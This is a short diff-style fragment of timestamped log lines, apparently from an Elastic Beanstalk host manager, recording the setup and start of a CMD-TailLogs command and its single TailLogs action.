+[2020-01-29T20:01:17.970Z] INFO  [27453] : Updating Command definition of addon logstreaming.
+[2020-01-29T20:01:17.970Z] INFO  [27453] : Updating Command definition of addon logpublish.
+[2020-01-29T20:01:17.970Z] DEBUG [27453] : Loaded definition of Command CMD-TailLogs.
+[2020-01-29T20:01:17.970Z] INFO  [27453] : Executing CMD-TailLogs
+[2020-01-29T20:01:17.970Z] INFO  [27453] : Executing command: CMD-TailLogs...
+[2020-01-29T20:01:17.970Z] INFO  [27453] : Executing command CMD-TailLogs activities...
+[2020-01-29T20:01:17.970Z] DEBUG [27453] : Setting environment variables..
+[2020-01-29T20:01:17.970Z] INFO  [27453] : Running AddonsBefore for command CMD-TailLogs...
+[2020-01-29T20:01:17.970Z] DEBUG [27453] : Running stages of Command CMD-TailLogs from stage 0 to stage 0...
+[2020-01-29T20:01:17.970Z] INFO  [27453] : Running stage 0 of command CMD-TailLogs...
+[2020-01-29T20:01:17.970Z] DEBUG [27453] : Loaded 1 actions for stage 0.
+[2020-01-29T20:01:17.970Z] INFO  [27453] : Running 1 of 1 actions: TailLogs...
+
+
+
